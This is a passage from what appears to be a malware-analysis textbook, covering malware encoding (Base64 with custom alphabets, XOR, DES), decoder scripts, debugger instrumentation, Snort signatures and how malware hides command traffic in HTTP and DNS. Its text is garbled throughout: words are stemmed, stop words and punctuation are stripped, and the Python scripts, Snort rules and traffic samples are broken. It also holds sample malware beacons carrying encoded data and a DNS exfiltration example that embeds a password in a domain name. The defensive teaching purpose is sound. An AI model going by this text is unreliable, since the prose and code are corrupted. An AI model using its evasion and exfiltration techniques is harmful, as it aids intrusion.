email attach transmiss wide use http xml base encod convert binari data limit charact set charact number scheme alphabet differ type base encod use primari charact usual addit charact indic pad often common charact set mime base use z z first valu last two valu result squeez data smaller set charact baseencod data end longer origin data everi byte binari data least byte baseencod data youv ever seen part raw email file like one shown exampl seen base encod top line show email header follow blank line baseencod data bottomexampl part raw email messag show base encod contenttyp multipartaltern boundari ebbdaacfaaededmbxthndrbird mimevers ebbdaacfaaededmbxthndrbird contenttyp texthtml charsetutf contenttransferencod base swygewigfyzsbyzwfkawnihroaxmsihlvdsbwcmiywjsesbzagbgqganvzdcbzalwihroax mgyhhchrlcibhbmqgzgdggdghliglehqgbllibebybbugcmvhbgxighhdmugdghlihrp bwugdggdhlwzsbaglzihdobxlihncmluzybpbjgwwigfyzsbvynzpbvzbhkgdgfszwzw quiehewjlihlvdsbzagbgqgyudgfjdcbagugyxvagycybhbmqgcvliglmih transform data base process translat raw data base fairli standard use bit byte chunk first charact place signific posit second middl bit third least signific bit next bit read block six start signific number repres bit use index byte long string allow byte base scheme figur show transform happen top line origin string att second line hex represent att nibbl level nibbl bit middl line show actual bit use repres att fourth line valu bit particular bitlong section decim number final last string charact use repres decim number via index refer string figur base encod att letter correspond bit first bit letter convert singl baseencod letter q last two bit first four bit letter convert thesecond baseencod charact v decod base raw data follow process revers base charact transform bit bit place sequenc bit read group eight group eight defin byte raw data identifi decod base let say investig malwar appear made two http get request shown exampl exampl sampl malwar traffic get xtbveuyc indexhtm userag mozilla compat msie window nt host wwwpracticalmalwareanalysiscom connect keepal cooki ymntqxnjq get cusyikywmcnujdflvbiajbwbfuyp indexhtm userag mozilla compat msie window nt host wwwpracticalmalwareanalysiscom connect keepal cooki ymntqxnjq practic easi identifi baseencod content appear random select charact charact set compos alphanumer charact plu two charact one pad charact may present end encod string pad length encod object divis four exampl appear first url path cooki baseencod valu cooki valu appear remain constant look like attack send two differ encod messag two get request quick way encod decod use base standard onlin tool decod found httpwwwopinionatedgeekcomdotnettoolsbasedecod simpli enter baseencod content top window click button label decod safe text exampl figur show happen run cooki valu base decoderfigur unsuccess attempt decod base string rememb everi three charact input becom four charact output fourcharact output block pad mani charact cooki string sinc know base string correctli pad technic pad charact option essenti accur decod malwar known avoid use pad charact presum appear less like base avoid network signatur figur add pad tri figur success decod base string due addit pad charact appar attack track bot give identif number baseencod cooki order find base function malwar look byte long string typic use implement algorithm commonli use string adher mime base standard abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz implement base typic use index string code contain base encod often telltal string charact baseindex string typic compos printabl charact would defeat intent algorithm therefor easili eyebal string output secondari piec evid use confirm use base encod algorithm exist lone pad charact typic hard code function perform encod next let look uri valu exampl string characterist base encod restrict randomlook charact set pad length divis four figur show find whenw run base decod figur unsuccess attempt decod base string due nonstandard index string obvious standard base encod one beauti thing base least malwar author point view easi develop custom substitut cipher item need chang index string desir characterist standard base long string uniqu charact work creat custom substitut cipher one simpl way creat new index string reloc charact front string exampl follow string creat move charact front string aabcdefghijklmnopqrstuvwxyzbcdefghijklmnopqrstuvwxyz string use base algorithm essenti creat new key encod string difficult decod without knowledg string malwar use techniqu make output appear base even though decod use common base function malwar creat get request shown exampl use custom substitut cipher look string output see mistook custom string standard one sinc look similar actual index string preced one charact move front string attack simpli use standard algorithm chang encod string figur tri decrypt time new string figur success decod base string use custom index stringcommon cryptograph algorithm simpl cipher scheme equival substitut cipher differ greatli modern cryptograph cipher modern cryptographi take account exponenti increas comput capabl ensur algorithm design requir much comput power break cryptographi impract simpl cipher scheme discuss previous dont even pretend protect bruteforc measur main purpos obscur cryptographi evolv develop time integr everi aspect comput use ssl web browser encrypt use wireless access point malwar alway take advantag cryptographi hide sensit inform malwar often use simpl cipher scheme easi often suffici also use standard cryptographi potenti drawback particularli regard malwar cryptograph librari larg malwar may need static integr code link exist code link code exist host may reduc portabl standard cryptograph librari easili detect via function import function match identif cryptograph constant user symmetr encrypt algorithm need worri hide key mani standard cryptograph algorithm reli strong key store secret idea algorithm wide known without key nearli imposs would requir massiv amount work decrypt cipher text order ensur suffici amount work decrypt key must typic long enough potenti key easili test standard algorithm malwar might use trick identifi algorithm also key sever easi way identifi use standard cryptographi theyinclud look string import refer cryptograph function use sever tool search specif content recogn string import one way identifi standard cryptograph algorithm recogn string refer use cryptographi occur cryptograph librari openssl static compil malwar exampl follow select string taken piec malwar compil openssl encrypt openssl sslv part openssl tlsv part openssl sslv part openssl need read openssl faq httpwwwopensslorgsupportfaqhtml sd openssl intern error assert fail ae x cryptogam approopensslorg anoth way look standard cryptographi identifi import refer cryptograph function exampl figur screenshot ida pro show cryptograph import provid servic relat hash key gener encrypt though microsoft function pertain cryptographi start crypt cp cryptograph provid cert figur ida pro import list show cryptograph function search cryptograph constant third basic method detect cryptographi use tool search commonli use cryptograph constant well look use ida prosfindcrypt krypto analyz use findcrypt ida pro plugin call findcrypt includ ida pro sdk avail httpwwwhexrayscomidaprofreefilesfindcryptzip search program bodi constant known associ cryptograph algorithm work well sinc cryptograph algorithm employ type magic constant magic constant fix string bit associ essenti structur algorithm note cryptograph algorithm employ magic constant notabl intern data encrypt algorithm idea rc algorithm build structur fli thu list algorithm identifi malwar often employ rc algorithm probabl small easi implement softwar cryptograph constant give away findcrypt run automat new analysi run manual plugin menu figur show ida pro output window result run findcrypt malici dll see malwar contain number constant begin de identifi function refer constant quickli get handl function implement cryptographi figur ida pro findcrypt output use krypto analyz tool use principl findcrypt ida pro plugin krypto analyz kanal kanal plugin peid httpwwwpeidhasit wider rang constant though result may tend produc fals posit addit constant kanal also recogn base tabl cryptographyrel function importsfigur show peid window left kanal plugin window right peid plugin run click arrow lowerright corner kanal run identifi constant tabl cryptographi relat function import list figur show kanal find base tabl crc constant sever crypt import function malwar figur peid krypto analyz kanal output search highentropi content anoth way identifi use cryptographi search highentropi content addit potenti highlight cryptograph constant cryptograph key techniqu also identifi encrypt content broad reach techniqu potenti applic case cryptograph constant found like rc warn highentropi content techniqu fairli blunt may best use last resort mani type contentsuch pictur movi audio file compress datadisplay high entropi indistinguish encrypt content except header ida entropi plugin httpwwwsmokedchickenorgidaentropi pluginhtml one tool implement techniqu pe file load plugin ida pro place idaentplw file ida pro plugin directori let use test case malwar show sign de encrypt figur file load ida pro start ida entropi plugin initi window entropi calcul shown leftwindow figur segment select analyz individu case focus small portion rdata segment deep analyz button use paramet specifi chunk size step size maximum entropi scan specifi area chunk exceed list entropi compar output figur result return deep analysi result window figur see address around xa highlight ida pro entropi plugin found de constant indic high degre entropi knowledg constant figur ida pro entropi plugin order use entropi test effect import understand depend chunk size entropi score set shown figur chunk size maximum entropi actual good gener test find mani type constant actual locat baseencod string well even one nonstandard byte string distinct byte valu highest possibl entropi valu valu relat entropi valu refer bit entropi sinc number valu express bit anoth set use chunk size entropi mean string consecut byte reflect nearli possibl byte valu ida pro entropi plugin also tool provid graphic overview area interest use guid valu select maximum entropi score also help determin focu drawbutton produc graph show higherentropi region lighter bar lowerentropi region darker bar hover graph mous cursor see raw entropi score specif spot graph entropi map difficult appreci print form line graph file includ figur illustr entropi map use graph figur gener use chunk size graph show high valu recal maximum entropi valu chunk size notic spike reach number area file contain de constant highlight figur figur figur entropi graph malici execut coupl featur stand one plateau block repres actual code typic code reach entropi valu level code typic contigu form seri connect peak interest featur spike end file fact fairli high valu unconnect peak make stand analyz found desencrypt configur data malwar hide commandandcontrol informationcustom encod malwar often use homegrown encod scheme one scheme layer multipl simpl encod method exampl malwar may perform one round xor encrypt afterward perform base encod result anoth type scheme simpli develop custom algorithm possibl similar standard publish cryptograph algorithm identifi custom encod discuss varieti way identifi common cryptographi encod function within malwar easili identifi string constant mani case techniqu alreadi discuss assist find custom cryptograph techniqu obviou sign howev job becom difficult exampl say find malwar bunch encrypt file directori roughli kb size exampl show initi byte one file exampl first byte encrypt file b eb e f g b ba b b c e af af crtmg f aa e c cb ed gwp e c b f b ibkoqp c e b c e xjh use tool describ thu far find obviou answer string provid indic cryptographi findcrypt kanal fail find cryptograph constant test high entropi find noth stand test find hint search xor find singl xor ebx eax instruct sake exercis let ignor detail find encod algorithm hard way entail trace thread execut suspici input output input output treat gener categori matter whether malwar send network packet write file write standard output output output suspect contain encod data encod function occur prior outputconvers decod occur input exampl say identifi input function first identifi data element affect input follow execut path forward look new function access data element question reach end function continu call function call took place note data locat case decrypt function far input function output function similar except trace must done opposit flow execut exampl assum output encrypt file found directori malwar look import malwar see createfilea writefil exist malwar function label suba also function happen contain singl xor function function graph portion suba shown figur notic writefil call right block label loca also notic xor ebx eax instruct loop may occur write block loca lefthand block contain call subf end block see counter increment counter label var call subf see return valu eax use xor oper ebx point result xor function bl low byte ebx byte valu bl written buffer lpbuffer plu current counter put piec evid togeth good guess call subf call get singl pseudorandom byte xore current byte buffer buffer label lpbuffer sinc use later writefil function subf appear paramet seem return singl byte eaxfigur function graph show encrypt write figur show relationship among encrypt function notic relationship subc subf common subroutin subc also paramet alway occur call subf subc initi function cryptograph routin share global variabl subf figur connect encrypt function investig find subc subf contain multipl refer three global variabl two dword valu byte array support hypothesi cryptograph initi function stream cipher function stream cipher gener pseudorandom bit stream combin plaintext via xor one odditi exampl initi function took password argument contain refer two dword valu pointer empti byte array lucki case encod function close output function wrote encrypt content easi locat encod function advantag custom encod attack attack customencod method advantag often retain characterist simpl encod scheme small size nonobvi use encrypt make job revers engin difficult arguabl reverseengin task type encod identifi encod process develop decod difficult mani type standard cryptographywith mani type standard cryptographi cryptograph algorithm identifi key found fairli easi write decryptor use standard librari custom encod attack creat encod scheme want may may use explicit key saw previou exampl key effect embed obscur within code even attack use key key found unlik freeli avail librari avail assist decryptiondecod find encod function isol import part analysi process typic youll also want decod hidden content two fundament way duplic encod decod function malwar reprogram function use function exist malwar selfdecod econom way decrypt datawheth algorithm known let program perform decrypt cours normal activ call process selfdecod youv ever stop malwar program debugg notic string memori didnt see ran string alreadi use self decod techniqu previous hidden inform decod point easier stop process analysi tri determin encod mechan use tri build decod although selfdecod cheap effect way decod content drawback first order identifi everi instanc decrypt perform must isol decrypt function set breakpoint directli decrypt routin import malwar doesnt happen decrypt inform interest figur coax malwar luck reason import use techniqu provid control manual program decod function simpl cipher encod method often use standard function avail within program languag exampl exampl show small python program decod standard baseencod string replac examplestr variabl decod string interest exampl sampl python base script import string import baseexamplestr vghpcybpcybhihrlcqgcryawn print basedecodestr examplestr simpl encod method lack standard function xor encod base encod use modifi alphabet often easiest cours action program script encod function languag choic exampl show exampl python function implement nullpreserv xor encod describ earlier chapter exampl sampl python nullpreserv xor script def nullpreservingxorinputcharkeychar inputchar keychar inputchar chrx return inputchar els return chrordinputchar ordkeychar function take two charactersan input charact key charact output translat charact convert string longer content use nullpreserv singlebyt xor encod send input charact key charact subroutin base modifi alphabet requir similarli simpl script exampl exampl show small python script translat custom base charact standard base charact use standard decodestr function part python base librari exampl sampl python custom base script import string import base custom zabcdefghijklmnopqrstuvwxyabcdefghijklmnopqrstuvwxyz base abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz ciphertext tegobxzobxzggfpkbo ch ciphertext ch base basestringfindcustomstrch elif ch result basedecodestr standard cryptograph algorithm best use exist implement avail code librari pythonbas cryptographi librari calledpycrypto httpwwwdlitznetsoftwarepycrypto provid wide varieti cryptograph function similar librari exist differ languag exampl show sampl python program perform decrypt use de algorithm exampl sampl python de script cryptociph import de import sy obj desnewpassworddesmodeecb cfile openencryptedfil cbuf fread print objdecryptcbuf use import pycrypto librari script open encrypt file call encryptedfil decrypt de electron code book ecb mode use password password block cipher like de use differ mode encrypt appli singl key arbitrari length stream plaintext mode must specifi librari call simplest mode ecb mode appli block cipher block plaintext individu mani possibl variat avail script decod algorithm preced exampl give idea type option avail write decod write version attack cryptograph algorithm typic reserv cipher simpl suffici well defin case standard cryptographi difficult challeng deal case cryptographi complex emul also nonstandard use instrument gener decrypt selfdecod tri get malwar decrypt limit let malwar run normal would stop right time reason limit normal execut path malwar direct encod decod routin isol paramet understood possibl fulli exploit malwar decod arbitrari content use instrument thu effect use malwar itselflet return malwar produc multipl larg encrypt file earlier custom encod section exampl show function header plu primari instruct part encrypt loop shown previous figur exampl code malwar produc larg encrypt file push ebp aa mov ebp esp ac sub esp h af push ebx b mov ebpcount b mov ebpnumberofbyteswritten f locf code xref encryptedwritej f call encryptinit fa fa locfa code xref encryptedwritefj fa mov ecx ebpcount fd cmp ecx ebpnnumberofbytestowrit jnb short loca mov edx ebplpbuff add edx ebpcount movsx ebx byte ptr edx b call encryptbyt eax ffh xor ebx eax mov eax ebplpbuff add eax ebpcount mov eax bl f mov ecx ebpcount add ecx mov ebpcount ecx jmp short locfa loca code xref encryptedwritej push lpoverlap c lea edx ebpnumberofbyteswritten know coupl key piec inform previou analysi know function subf initi encrypt start encrypt routin call address xf exampl function label encryptinit know reach address xa encrypt complet know sever variabl argument use encrypt function includ counter two argument buffer lpbuffer encrypt decrypt length nnumberofbytestowrit thebuff encrypt file malwar knowledg encrypt function work highlevel goal instrument malwar take encrypt file run routin use encrypt assum base use xor function revers highlevel goal broken seri task set malwar debugg prepar encrypt file read prepar output file write alloc memori insid debugg malwar refer memori load encrypt file alloc memori region set malwar appropri variabl argument encrypt function run encrypt function perform encrypt write newli decrypt memori region output file order implement instrument perform highlevel task use immun debugg immdbg introduc chapter immdbg allow python script use program debugg immdbg script exampl fairli gener sampl written process encrypt file found malwar therebi retriev plaintext exampl immdbg sampl decrypt script import immlib def main imm immlibdebugg cfile opencencryptedfilerb open encrypt file read pfile opendecryptedfil w open file plaintext buffer cfileread read encrypt file buffer sz lenbuff get length buffer membuf immremotevirtualallocsz alloc memori within debugg immwritememorymembufbuff copi debug processs memori immsetregeip xa start function header immsetbreakpointxb function header immrun execut function header reg immgetreg immwritelongregsebp sz set numberofbytestowrit stack variabl immwritelongregsebp membuf set lpbuffer stack variabl immsetregeip xf start crypto immsetbreakpointxa end crypto loop immrun execut crypto loop output immreadmemorymembuf sz read answer pfilewriteoutput write answer script exampl follow highlevel task close immlib python librari immlibdebugg call provid programmat access debugg open call open file read encrypt file write decrypt version note rb option open command ensur binari charact interpret correctli without b flag binari charact evalu endoffil charact termin read prematur immremotevirtualalloc command alloc memori within malwar process space insid debugg memori directli referenc malwar cfileread command read encrypt file python buffer immwritememori use copi memori python buffer memori process debug immgetreg function use get current regist valu ebp regist use locat two key argument memori buffer decrypt size argument set use immwritelong function actual run code done two stage follow guid set breakpoint use immsetbreakpoint call set eip use immsetregeiploc call immrun call initi portion code run start function set stack frame set counter zero first stage xa eip set xb breakpoint stop execut second part code run actual encrypt loop debugg move instruct pointer start cryptograph initi function xf second stage xf eip set loop one time byte decrypt loop exit xa reach breakpoint stop execut final buffer read process memori python memori use immreadmemori output file use pfilewrit actual use script requir littl prepar file decrypt must expect locat cencryptedfil order run malwar open immdbg run script select run python script option immlib menu press alt f select file contain python script exampl run file output file decryptedfil show immdbg base directori cprogram filesimmun incimmun debugg unless path specifi explicitli exampl encrypt function stood alon didnt depend fairli straightforward howev encod function standalon requir initi possibl key case key may even resid malwar may acquir outsid sourc network order support decod case necessari first malwar properli prepar prepar may mere mean malwar need start normal fashion exampl use embed password key case may necessari custom extern environ order get decod work exampl malwar commun use encrypt seed key malwar receiv server may necessari either script keysetup algorithm appropri key materi simul server send keyconclus malwar author malwar analyst continu improv capabl skill effort avoid detect frustrat analyst malwar author increasingli employ measur protect intent techniqu commun primari tool dispos encod encrypt encod affect commun also pertain make malwar difficult analyz understand fortun proper tool mani techniqu use rel easili identifi counter chapter cover popular encrypt encod techniqu use malwar also discuss number tool techniqu use identifi understand decod encod method use malwar chapter focus encod gener explain identifi encod perform decod next chapter look specif malwar use network command control mani case network commandandcontrol traffic encod yet still possibl creat robust signatur detect malici communicationlab lab analyz malwar found file labex question q compar string malwar output string command inform avail via dynam analysi base comparison element might encod q use ida pro look potenti encod search string xor type encod find q key use encod content encod q use static tool findcrypt krypto analyz kanal ida entropi plugin identifi encod mechan find q type encod use portion network traffic sent malwar q base function disassembl q maximum length baseencod data sent encod q malwar would ever see pad charact baseencod data q malwar lab analyz malwar found file labex question q use dynam analysi determin malwar creat q use static techniqu xor search findcrypt kanal ida entropi plugin look potenti encod find q base answer question import function would good prospect find encod function q encod function disassemblyq trace encod function sourc encod content content q find algorithm use encod decod content q use instrument recov origin sourc one encod file lab analyz malwar found file labex question q compar output string inform avail via dynam analysi base comparison element might encod q use static analysi look potenti encod search string xor type encod find q use static tool like findcrypt kanal ida entropi plugin identifi encod mechan find compar xor find q two encod techniqu use malwar q encod techniqu key q cryptograph encrypt algorithm key suffici els must known q malwar q creat code decrypt content produc dynam analysi contentchapt malwarefocus network signatur malwar make heavi use network connect chapter well explain develop effect networkbas countermeasur countermeasur action taken respons threat detect prevent malici activ develop effect countermeasur must understand malwar use network challeng face malwar author use advantag network countermeasur basic attribut network activitysuch ip address tcp udp port domain name traffic contentar use network secur devic provid defens firewal router use restrict access network base ip address port dn server configur rerout known malici domain intern host known sinkhol proxi server configur detect prevent access specif domain intrus detect system idss intrus prevent system ipss secur applianc email web proxi make possibl employ contentbas countermeasur contentbas defens system allow deeper inspect traffic includ network signatur use id algorithm use mail proxi detect spam basic network indic ip address domain name support defens system often first item malwar analyst investig note commonli use term intrus detect system outdat signatur use detect intrus scan servic enumer profil nonstandard use protocol beacon instal malwar ip close relat id differ id design mere detect malici traffic ip design detect malici traffic prevent travel networkobserv malwar natur habitat first step malwar analysi run malwar lab environ break open malwar start analyz disassembl code rather first review data alreadi malwar occasion analyst hand malwar sampl suspici execut without context situat acquir addit data best way start networkfocus malwar analysi mine log alert packet captur alreadi gener malwar distinct advantag inform come real network rather lab environ livecaptur inform provid transpar view malici applic true behavior malwar program detect lab environ exist inform activ malwar provid uniqu insight acceler analysi real traffic provid inform malwar end point client server wherea lab environ analyst typic access inform one end point analyz content receiv malwar pars routin typic challeng analyz content malwar produc therefor bidirect sampl traffic help seed analysi pars routin malwar analyst hand addit passiv review inform risk analysi activ leak attack issu explain detail opsec oper secur indic malici activ suppos weve receiv malwar execut analyz run lab environ keep eye network event find malwar dn request wwwbadsitecom http get request port ip address return dn record thirti second later tri beacon specif ip address without dn queri point three potenti indic malici activ domain name itsassoci ip address standalon ip address http get request uri content shown tabl tabl sampl network indic malici activ inform type indic domain resolv ip address wwwbadsitecom ip address get request get indexhtm http accept userag wefa cachecontrol would probabl want research indic internet search might reveal long ago malwar creat first detect preval might written attack object might lack inform instruct well sinc impli exist target attack new campaign rush favorit search engin howev import understand potenti risk associ onlin research activ opsec oper secur use internet research import understand concept oper secur opsec opsec term use govern militari describ process prevent adversari obtain sensit inform certain action take investig malwar inform malwar author youv identifi malwar may even reveal person detail attack exampl analyz malwar home malwar sent corpor network via email attack may notic dn request made ip address space outsid space normal use compani mani potenti way attack identifi investig activ follow send target phish known spearphish email link aspecif individu watch access attempt link ip address outsid expect geograph area design exploit creat encod link blog comment internetaccess freeli edit site effect creat privat publicli access infect audit trail emb unus domain malwar watch attempt resolv domain attack awar investig may chang tactic effect disappearsaf investig attack onlin safest option use internet investig attack often impract use internet use indirect evad attack potenti watch eye indirect tactic one indirect tactic use servic mechan design provid anonym tor open proxi webbas anonym type servic may help protect privaci often provid clue tri hide thu could arous suspicion attack anoth tactic use dedic machin often virtual machin research hide precis locat dedic machin sever way follow use cellular connect tunnel connect via secur shell ssh virtual privat network vpn remot infrastructur use ephemer remot machin run cloud servic amazon elast comput cloud amazon ec search engin site design internet research also provid indirect search search engin usual fairli safe two caveat inclus domain name queri engin previous awar may prompt crawler activ click search engin result even cach resourc still activ secondari later link associ site next section highlight websit provid consolid inform network entiti whoi record dn lookup includ histor lookup record revers dn lookup get ip address domain inform two fundament element compos landscap internet ipaddress domain name dn translat domain name like wwwyahoocom ip address back unsurprisingli malwar also use dn look like regular traffic maintain flexibl robust host malici activ figur show type inform avail dn domain ip address domain name regist registr inform domain name server relev date contact inform entiti regist name store domain registrar internet address registri call region internet registri rir store ip address block block organ assign variou type contact inform dn inform repres map domain name ip address addit metadata avail includ blacklist appli ip address domain name geograph inform appli ip address figur type inform avail dn domain ip address domain ip registri queri manual use commandlin tool also numer free websit perform basic lookup use websit queri sever advantag mani followon lookup automat provid level anonym frequent provid addit metadata base histor inform orqueri sourc inform includ blacklist geograph inform ip address figur exampl two whoi request domain use commandandcontrol server backdoor use target attack although backdoor differ name list registr domain three lookup site deserv special mention domaintool httpwwwdomaintoolscom provid histor whoi record revers ip lookup show domain resolv particular ip address revers whoi allow whoi record lookup base contact inform metadata servic provid domaintool requir membership also requir payment robtex httpwwwrobtexcom provid inform multipl domain name point singl ip address integr wealth inform whether domain ip address one sever blacklist bfk dn logger httpwwwbfkdebfkdnsloggerenhtml use passiv dn monitor inform one freeli avail resourc type monitor sever passiv dn sourc requir fee limit profession secur researchersfigur sampl whoi request two differ domainscontentbas network countermeasur basic indic ip address domain name valuabl defend specif version malwar valu shortliv sinc attack adept quickli move differ address domain indic base content hand tend valuabl longer last sinc identifi malwar use fundament characterist signaturebas idss oldest commonli deploy system detect malici activ via network traffic id detect depend knowledg malici activ look like know look like creat signatur detect happen ideal signatur send alert everi time someth malici happen true posit creat alert anyth look like malwar actual legitim fals posit intrus detect snort one popular idss call snort snort use creat signatur rule link togeth seri element call rule option must true rule fire primari rule option divid identifi content element call payload rule option snort lingo identifi element content relat call nonpayload rule option exampl nonpayload rule option includ certain flag specif valu tcp ip header size packet payload exampl rule option flowestablishedtocli select packet part tcp session origin server destin client anoth exampl dsize select packet byte payload let creat basic snort rule detect initi malwar sampl look earlier chapter summar tabl malwar gener network traffic consist http get request browser http applic make request popul user agent header field order commun applic use request typic browser userag start string mozilla due histor convent may look someth like mozilla compatiblemsi window nt userag provid inform version browser os userag use malwar discuss earlier wefa distinct use identifi malwaregener traffic follow signatur target unusu userag string use sampl run malwar alert tcp homenet externalnet httpport msgtrojan malici user agent contentd auserag wefa classtypetrojanact sid rev snort rule compos two part rule header rule option rule header contain rule action typic alert protocol sourc destin ip address sourc destin port convent snort rule use variabl allow custom environ homenet externalnet variabl use specifi intern extern network ip address rang httpport defin port interpret http traffic case sinc header indic rule appli traffic go one direct homenet externalnet httpport header match outbound traffic destin http port rule option section contain element determin whether rule fire inspect element gener evalu order must true rule take action tabl describ keyword use preced rule tabl snort rule keyword descript keyword descript msg messag print alert log entri content search specif content packet payload see discuss follow tabl classtyp gener categori rule belong sid uniqu identifi rulesrev sid uniqu identifi rule revis within content term pipe symbol use indic start end hexadecim notat anyth enclos two pipe symbol interpret hex valu instead raw valu thu repres break http header sampl signatur content rule option match http header field userag wefa sinc http header separ two charact origin indic snort signatur often especi autom analysi techniqu sandbox analysi networkbas indic would consid complet point ip address block firewal domain name block proxi network signatur load id stop howev would mistak sinc current measur provid fals sens secur take deeper look malwar analyst must alway strike balanc expedi accuraci networkbas malwar analysi expedi rout run malwar sandbox assum result suffici accur rout fulli analyz malwar function function exampl previou section real malwar snort signatur creat submit emerg threat list signatur emerg threat set communitydevelop freeli avail rule creator signatur origin submiss propos rule state seen two valu userag string real traffic wefa weea submit follow rule base observ alert tcp homenet externalnet httpport msget trojan windowsenterprisesuit fakeav dynam userag flowestablishedtoserv contentd auserag isdataatrel contentd distanc pcre userag weazxdxa classtypetrojanact referenceurlwwwthreatexpertcomreportaspxmd dbcbedaedfabfef sid rev rule coupl addit keyword describ tabl tabl addit snort rule keyword descriptionskeyword descript flow specifi characterist tcp flow inspect whether flow establish whether packet client server isdataat verifi data exist given locat option rel last match distanc modifi content keyword indic number byte ignor past recent pattern match pcre perl compat regular express indic pattern byte match refer refer extern system rule rather long core rule simpli userag string follow exactli four alphanumer charact weaz perl compat regular express pcre notat use snort follow charact use squar bracket indic set possibl charact curli bracket indic number charact hexadecim notat byte form x hh note previous rule header provid basic inform ip address sourc destin port protocol snort keep track tcp session allow write rule specif either client server traffic base tcp handshak rule flow keyword ensur rule fire clientgener traffic within establish tcp session use rule modifi slightli remov fals posit associ use popular webmin softwar happen userag string match pattern creat malwar follow recent rule write alert tcp homenet externalnet httpport msget trojan windowsenterprisesuit fakeav dynam userag flowestablishedtoserv contentd auseragenta isdataatrel contentd distanc contentuseragenta webmind pcre userag weazxdxa classtypetrojanact referenceurlwwwthreatexpertcomreportaspxmddbcbedaedfabf ef referenceurldocemergingthreatsnet referenceurlwwwem gingthreatsnetcgibincvswebcgisigsvirustrojanwindowsenterprisefakeav sid rev bang symbol content express contentuseragentawebmind indic logic invert select rule trigger content describ present exampl illustr sever attribut typic signaturedevelop process first signatur creat base analysi network traffic rather analysi malwar gener traffic exampl submitt identifi two string gener malwar specul malwar use prefix plu four addit random alphanumer charact second uniqu pattern specifi signatur test ensur signatur free fals posit done run signatur across real traffic identifi instanc fals posit occur case origin signatur run across real traffic legitim traffic userag webmin produc fals posit result signatur refin ad except valid traffic previous mention traffic captur malwar live may provid detail difficult replic laboratori environ sinc analyst typic see one side convers hand number avail sampl live traffic may small one way ensur robust sampl repeat dynam analysi malwar mani time let imagin ran exampl malwar multipl time gener follow list userag string web wedf weaee wed wea wed weda weba wedd wed wec wed wee weef wefa wead weab wee easi way identifi random element malwaregener traffic result appear confirm assumpt made offici emerg threat signatur correct result suggest charact set ofth four charact alphanumer charact randomli distribut howev anoth issu current signatur assum result real result appear use smaller charact set specifi signatur pcre list userag weaz xdxa result suggest charact limit f rather z charact distribut often use binari valu convert directli hex represent addit thought experi imagin result multipl run malwar result follow userag string instead wfbcc wfabd weaee wfaf wedb w wef wfaf wefd wfa wfaf wff wefc wf weab weaf wfdc wab wff wfab signatur may catch instanc obvious ideal given whatev gener traffic produc wf w least addit also clear sampl although userag often six charact could seven charact origin sampl size two assumpt made underli code may overli aggress dont know exactli code produc list result make better guess dynam gener addit sampl allow analyst make inform assumpt underli code recal malwar use system inform input send thu help least two system gener sampl traffic prevent fals assumpt whether part beacon static content may static particular host may vari host host exampl let assum run malwar multipl time singl host get follow resultswefd wefd wefd wefd wefd wefd wefd wefd wefd wefd wefd wefd assum didnt live traffic crosscheck might mistakenli write rule detect singl userag howev next host run malwar might produc write signatur import identifi variabl element target content mistakenli includ signatur content differ everi trial run typic indic sourc data random seed content static particular host vari differ host suggest content deriv host attribut lucki case content deriv host attribut may suffici predict justifi inclus network signaturecombin dynam static analysi techniqu far use either exist data output dynam analysi inform gener signatur measur expedi gener inform quickli sometim fail identifi deeper characterist malwar lead accur longerlast signatur gener two object deeper analysi full coverag function first step increas coverag code use dynam analysi process describ chapter typic involv provid new input code continu unus path order determin malwar expect receiv typic done tool like inetsim custom script process guid either actual malwar traffic static analysi understand function includ input output static analysi use see content gener predict behavior malwar dynam analysi use confirm expect behavior predict static analysi danger overanalysi goal malwar analysi develop effect network indic dont need understand everi block code know whether suffici understand function piec malwar tabl propos hierarchi analysi level tabl malwar analysi level analysi level descript surfac analysi analysi initi indic equival sandbox output commun understand code type commun techniquemethod coverag oper replic abil creat tool allow full oper malwar serverbas control exampl code coverag understand everi block code minimum level analysi gener understand method associ network commun howev develop power network indic analyst must reach level understand commun method use abil replic oper capabl oper replic abil creat tool close mimic one attack creat oper malwar remot exampl malwar oper client malwar server softwar would server listen connect provid consol analyst use tickl everi function malwar perform malwar creator would effect robust signatur differenti regular traffic traffic associ malwar challeng sinc malwar author continu evolv malwar blend effect normal traffic tackl mechan analysi well discuss histori malwar camouflag strategi chang hide plain sight evad detect one primari object someon oper backdoor sinc detect result loss attack access exist victim increas risk futur detect malwar evolv evad detect tri blend background use follow techniqu attack mimic exist protocol one way attack blend background use popular commun protocol malici activ like get lost crowd internet relay chat irc popular attack use extens legitim irc traffic decreas defend began watch irc traffic care attack harder time blend sinc http http dn today extens use protocol theinternet attack primarili use protocol protocol close watch extrem difficult monitor larg amount traffic also much less like block due potenti consequ accident block lot normal traffic attack blend use popular protocol way similar legitim traffic exampl attack often use http beacon sinc beacon basic request instruct like http get request use http encrypt hide natur intent commun howev attack also abus standard protocol order achiev command andcontrol object exampl although dn intend provid quick short exchang inform attack tunnel longer stream inform dn encod inform embed field differ intend purpos dn name manufactur base data attack wish pass malwar attempt pass user secret password could perform dn request domain wwwthepasswordisflapjackmaliciousdomaincom attack also abus http standard get method intend request inform post method intend send inform sinc intend request get method provid limit amount space data typic around kb spywar regularli includ instruct want collect uri path queri http get rather bodi messag similarli piec malwar observ author inform infect host embed userag field multipl http get request follow two get request show malwar produc send back command prompt follow directori list get worldhtml http userag nqvtmwevhtfebnzvwaniiqqbqqgtvmxjzvhjqjmjchtehinyyduqh brfzthrfeakkoyitbimjuqjdvijatxqhdmjjqfgezmctnqgvvxeecbztntrfu qkxmgcglq cachecontrol nocach get worldhtml http userag ebtavdpytmzvsumwvhtmecrrmdzvdxsqfvvjjsqvhcgvqoqohpduqb xeakgvqfvmszmdbjtsfhnsdjnejqfgeazmwptncdmatskvcavhjgvqpzndiqsqkuebjvn dzvwnerayjqfginaitaitciqimlieqofqeqlafotjqeqeqeqhqfginait aitciqimlieqofqeqlafotjqeqeqeqhsjjtabheebheebinqejktkeabj qecampeeqeqeqeavmhyfvijtdhecheebiuqejktekeabjeqecampe qeqeqeatrnwdurvmbfginainaaitciqiuljnmqofqeqlafotjqeqeqeqn ruqctnqgvvxeybimeimdikecinygknmqeavmlsqeqeqenncbdnjtqkgyqeqeqeqeqebeatzvcoymduqeqeqeqeqeqsxvftrijsqeq qeqeqesqcvdgdizeqkbgieexitobhsdjsrvmdwmwpvyjuilraasipytqk fmdrvwqohpfncvztijmmtj cachecontrol nocach attack tunnel malici commun misus field protocol avoid detect although sampl command traffic look unusu train eye attack bet hide content unusu place may abl bypass scrutini defend search content bodi http session sampl exampl wont see traffic malwar author evolv techniqu time make malwar look realist 